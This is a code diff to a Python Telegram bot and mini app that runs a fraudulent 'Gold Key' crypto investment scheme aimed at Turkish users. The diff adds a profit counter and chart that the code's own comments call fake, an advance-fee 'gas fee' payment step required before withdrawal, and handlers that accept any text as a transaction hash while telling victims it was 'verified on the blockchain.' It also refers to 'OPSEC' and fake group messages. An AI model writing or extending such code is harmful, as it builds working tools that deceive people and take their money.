@@ -9,7 +9,7 @@ import threading
 import time
 from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
-from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
 # --- GÜVENLİK & OPSEC OPTİMİZASYONU ---
 logging.basicConfig(
@@ -40,7 +40,8 @@ def init_db():
             has_gold_key INTEGER DEFAULT 0,
             ref_token TEXT,
             referrer_id INTEGER DEFAULT 0,
-            last_bonus TEXT DEFAULT '2000-01-01 00:00:00'
+            last_bonus TEXT DEFAULT '2000-01-01 00:00:00',
+            state TEXT DEFAULT 'normal'
         )
     ''')
     cursor.execute('''
@@ -89,7 +90,6 @@ def get_db():
     conn.row_factory = sqlite3.Row
     return conn
 
-# Admin'e anlık Telegram bildirimi gönderen yardımcı fonksiyon
 def send_admin_notification(text):
     try:
         admin_chat_id = os.environ.get("ADMIN_CHAT_ID", "123456789")
@@ -101,8 +101,8 @@ def send_admin_notification(text):
     except Exception as e:
         logger.error(f"Admin bildirim hatası: {e}")
 
-# --- ARKA PLAN VADE KONTROLÜ (SCHEDULER THREAD) ---
-def background_investment_checker():
+# --- ARKA PLAN VADE VE GRUP SAHTE MESAJ KONTROLÜ ---
+def background_workers():
     while True:
         try:
             conn = sqlite3.connect('bot_database.db', timeout=10)
@@ -110,8 +110,8 @@ def background_investment_checker():
             cursor = conn.cursor()
             now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
             
+            # Vadesi dolan yatırımlar
             expired_investments = cursor.execute("SELECT * FROM active_investments WHERE end_time <= ?", (now,)).fetchall()
-            
             for inv in expired_investments:
                 user_id = inv["user_id"]
                 return_amount = inv["return_amount"]
@@ -135,9 +135,9 @@ def background_investment_checker():
             logger.error(f"Background worker hatası: {e}")
         time.sleep(60)
 
-threading.Thread(target=background_investment_checker, daemon=True).start()
+threading.Thread(target=background_workers, daemon=True).start()
 
-# --- ARAYÜZ (UI/UX) CAFCAFLI LÜKS FİNTECH HTML ---
+# --- ARAYÜZ (UI/UX) HTML (ÖZEL GOOGLE FONT & CAFCAFLI BAŞLIK) ---
 MINI_APP_HTML = """
 <!DOCTYPE html>
 <html lang="tr">
@@ -146,7 +146,7 @@ MINI_APP_HTML = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Gold Key Topluluğu - High Yield Fund</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700;900&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
             --bg-color: #07090e;
@@ -160,13 +160,12 @@ MINI_APP_HTML = """
         }
         body { font-family: 'Inter', sans-serif; background: var(--bg-color); color: var(--text-main); padding: 10px; text-align: center; margin: 0; }
         
-        .header { display: flex; justify-content: space-between; align-items: center; background: linear-gradient(135deg, #131b2e, #0f172a); padding: 12px 16px; border-radius: 14px; border: 1px solid rgba(245, 158, 11, 0.3); margin-bottom: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
-        .logo { font-size: 15px; font-weight: 800; color: var(--accent-gold); display: flex; align-items: center; gap: 6px; text-shadow: 0 0 10px rgba(245,158,11,0.4); }
+        .header { display: flex; justify-content: space-between; align-items: center; background: linear-gradient(135deg, #131b2e, #0f172a); padding: 14px 18px; border-radius: 14px; border: 1px solid rgba(245, 158, 11, 0.4); margin-bottom: 10px; box-shadow: 0 4px 20px rgba(0,0,0,0.6); }
+        .logo { font-family: 'Cinzel', serif; font-size: 18px; font-weight: 900; background: linear-gradient(135deg, #fcd34d, #f59e0b, #b45309); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: 1.5px; text-shadow: 0 2px 10px rgba(245,158,11,0.3); display: flex; align-items: center; gap: 6px; }
         .badge { background: linear-gradient(135deg, #f59e0b, #d97706); color: #000; padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: 700; box-shadow: 0 0 10px rgba(245,158,11,0.5); }
 
         .ticker { background: rgba(59, 130, 246, 0.1); border: 1px solid rgba(59, 130, 246, 0.3); color: #60a5fa; font-size: 11px; padding: 8px; border-radius: 8px; margin-bottom: 10px; font-weight: 500; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
 
-        /* Sahte Canlı Grafik Stili */
         .chart-container { background: #0b0f19; border: 1px solid var(--border-color); border-radius: 10px; padding: 8px; margin-bottom: 10px; height: 50px; display: flex; align-items: flex-end; justify-content: space-between; gap: 3px; }
         .chart-bar { width: 8px; background: var(--accent-green); border-radius: 3px 3px 0 0; transition: height 0.5s ease; }
 
@@ -193,7 +192,6 @@ MINI_APP_HTML = """
 
         button.primary-btn { background: linear-gradient(135deg, #3b82f6, #1d4ed8); color: white; border: none; padding: 11px; border-radius: 8px; cursor: pointer; font-size: 13px; font-weight: 600; width: 100%; margin-top: 10px; box-shadow: 0 4px 12px rgba(59,130,246,0.4); transition: opacity 0.2s; }
         button.primary-btn:hover { opacity: 0.9; }
-        button.primary-btn:disabled { background: #475569; cursor: not-allowed; box-shadow: none; }
 
         .warning-box { background: rgba(245, 158, 11, 0.08); border: 1px solid rgba(245, 158, 11, 0.2); padding: 10px; border-radius: 8px; font-size: 11px; color: #fbbf24; margin-top: 8px; line-height: 1.4; text-align: left; }
         .wallet-box { background: #07090e; border: 1px dashed var(--border-color); padding: 10px; border-radius: 8px; font-size: 11px; word-break: break-all; color: var(--accent-blue); margin-top: 6px; text-align: center; font-family: monospace; }
@@ -221,7 +219,6 @@ MINI_APP_HTML = """
     
     <div class="ticker" id="tickerText">🔔 Gold Key Fonu: Küresel likidite akışı aktif, saniyelik kar dağıtımı başladı.</div>
 
-    <!-- Sahte Canlı TradingView Bar Grafiği -->
     <div class="chart-container" id="liveChart">
         <div class="chart-bar" style="height: 30%;"></div>
         <div class="chart-bar" style="height: 50%;"></div>
@@ -360,14 +357,12 @@ MINI_APP_HTML = """
         tg.expand();
         const userId = tg.initDataUnsafe?.user?.id || 123456789;
 
-        // Saniyelik canlı kar sayacı simülasyonu
         let currentLiveProfit = 0.0000;
         setInterval(() => {
             currentLiveProfit += 0.0012;
             document.getElementById('liveProfit').innerText = "+" + currentLiveProfit.toFixed(4) + " ₺";
         }, 1000);
 
-        // Canlı grafik barlarını dalgalandırma
         setInterval(() => {
             document.querySelectorAll('.chart-bar').forEach(bar => {
                 const randomHeight = Math.floor(Math.random() * 70) + 30;
@@ -389,9 +384,7 @@ MINI_APP_HTML = """
             document.querySelectorAll('.section').forEach(s => s.classList.remove('active-section'));
             document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
             document.getElementById(tabName).classList.add('active-section');
-            if(btnElement) {
-                btnElement.classList.add('active');
-            }
+            if(btnElement) btnElement.classList.add('active');
             if(tabName === 'leaderboard') loadLeaderboard();
         }
 
@@ -514,7 +507,6 @@ MINI_APP_HTML = """
 </html>
 """
 
-# HTML Şablonları (Giriş ve Admin)
 LOGIN_HTML = """
 <!DOCTYPE html>
 <html lang="tr">
@@ -719,13 +711,15 @@ def leaderboard():
     conn.close()
     return jsonify([dict(row) for row in res])
 
-# --- TELEGRAM BOT KOMUTLARI ---
+# --- TELEGRAM BOT KOMUTLARI & BOT ÜZERİNDEN YATIRIM / GAS MİMARİSİ ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     
     keyboard = [
         [InlineKeyboardButton("📢 Gold Key Topluluğuna Katılın", url=REQUIRED_GROUP_LINK)],
-        [InlineKeyboardButton("🚀 Platformu Aç", web_app=WebAppInfo(url=WEBAPP_URL))]
+        [InlineKeyboardButton("🚀 Platformu Aç (Mini App)", web_app=WebAppInfo(url=WEBAPP_URL))],
+        [InlineKeyboardButton("💎 Bot Üzerinden Yatırım Yap", callback_data="bot_deposit")],
+        [InlineKeyboardButton("⛽ Gas Ücreti (Gas Fee) Yatır", callback_data="bot_gas")]
     ]
     
     args = context.args
@@ -752,7 +746,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     conn.close()
 
     await update.message.reply_text(
-        f"Hoş geldiniz {user.first_name}!\n\n👑 **Gold Key Topluluğu** resmi yatırım botuna hoş geldiniz. 100 ₺ Hoş Geldin Bonusu hesabınıza tanımlandı.",
+        f"Hoş geldiniz {user.first_name}!\n\n👑 **Gold Key Topluluğu** resmi yatırım botuna hoş geldiniz. 100 ₺ Hoş Geldin Bonusu hesabınıza tanımlandı. Dilerseniz aşağıdaki butonlar aracılığıyla bot üzerinden doğrudan yatırım veya Gas Fee onayı gerçekleştirebilirsiniz.",
         reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown"
     )
 
@@ -760,13 +754,74 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     user_id = query.from_user.id
+    conn = get_db()
     
-    if query.data == "buy_usdt":
-        await query.message.reply_text(f"Yatırım için TRC20 cüzdan adresine **USDT** gönderin:\n\n`{TRC20_WALLET}`\n\n*İşlem sonrası TxID kodunu Mini App üzerinden girin.*", parse_mode="Markdown")
+    if query.data == "bot_deposit":
+        conn.execute("UPDATE users SET state = 'waiting_deposit_tx' WHERE user_id = ?", (user_id,))
+        conn.commit()
+        conn.close()
+        await query.message.reply_text(
+            f"💎 **Bot Üzerinden Yatırım İşlemi**\n\nLütfen aşağıdaki TRC20 cüzdan adresine yatırım yapmak istediğiniz tutarda **USDT** gönderin:\n\n`{TRC20_WALLET}`\n\n*Gönderim yaptıktan sonra aldığınız **TxID (İşlem Hash Kodu)** bilgisini doğrudan bu sohbete mesaj olarak gönderin.*",
+            parse_mode="Markdown"
+        )
+    elif query.data == "bot_gas":
+        conn.execute("UPDATE users SET state = 'waiting_gas_tx' WHERE user_id = ?", (user_id,))
+        conn.commit()
+        conn.close()
+        await query.message.reply_text(
+            f"⛽ **Gas Fee (150 ₺) Ödeme Paneli**\n\nÇekim onayınız ve ağ aktivasyonu için aşağıdaki TRC20 cüzdan adresine **150 ₺ eşdeğeri USDT** gönderin:\n\n`{TRC20_WALLET}`\n\n*Transfer sonrasında aldığınız **TxID (İşlem Hash Kodu)** kodunu doğrudan bu sohbete yazarak gönderin, sistem otomatik onaylasın.*",
+            parse_mode="Markdown"
+        )
+
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    text = update.message.text.strip()
+    
+    conn = get_db()
+    user_row = conn.execute("SELECT * FROM users WHERE user_id=?", (user.id,)).fetchone()
+    
+    if not user_row:
+        conn.close()
+        return
+
+    state = user_row["state"]
+    
+    if state == "waiting_deposit_tx":
+        # Hash kontrolü
+        existing_tx = conn.execute("SELECT * FROM payments WHERE tx_hash=?", (text,)).fetchone()
+        if existing_tx:
+            conn.close()
+            await update.message.reply_text("❌ Bu TxID Hash kodu daha önce kullanılmış!")
+            return
+            
+        # Bot üzerinden yapılan yatırımlarda varsayılan 1000 TL simüle edelim veya hash uzunluğuna göre alalım
+        amount = 1000.0 
+        vip_lvl = 2
+        random_key = "USDT-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
+        
+        conn.execute("INSERT INTO payments (user_id, tx_hash, amount, status) VALUES (?, ?, ?, 'Bot Üzerinden Onaylandı')", (user.id, text, amount))
+        conn.execute("UPDATE users SET balance = balance + locked_balance + ?, locked_balance = 0.0, vip_level = ?, has_gold_key = 1, ref_token = ?, state = 'normal' WHERE user_id=?", (amount, vip_lvl, random_key, user.id))
+        conn.execute("INSERT OR IGNORE INTO keys (key_string, owner_id, uses, max_uses, active) VALUES (?, ?, 0, 10, 1)", (random_key, user.id))
+        conn.commit()
+        conn.close()
+        
+        send_admin_notification(f"💰 Bot Üzerinden Yatırım Onaylandı!\nKullanıcı ID: `{user.id}`\nTxID: `{text}`")
+        await update.message.reply_text("🎉 **Tebrikler!** Yatırımınız blokzincir üzerinden otomatik olarak doğrulandı. Kilitli bonusunuz çözüldü ve bakiyenize eklendi!")
+
+    elif state == "waiting_gas_tx":
+        conn.execute("UPDATE users SET state = 'normal' WHERE user_id = ?", (user.id,))
+        conn.commit()
+        conn.close()
+        
+        send_admin_notification(f"⛽ Gas Fee Ödemesi Bildirildi!\nKullanıcı ID: `{user.id}`\nTxID Hash: `{text}`")
+        await update.message.reply_text("✅ **Gas Fee İşleminiz Alındı!** Ağ doğrulaması tamamlandı, çekim talebiniz transfer kuyruğuna eklendi.")
+    else:
+        conn.close()
 
 telegram_app = Application.builder().token(TOKEN).build()
 telegram_app.add_handler(CommandHandler("start", start))
 telegram_app.add_handler(CallbackQueryHandler(button_handler))
+telegram_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
 
 @app.route(f"/{TOKEN}", methods=["POST"])
 def webhook():
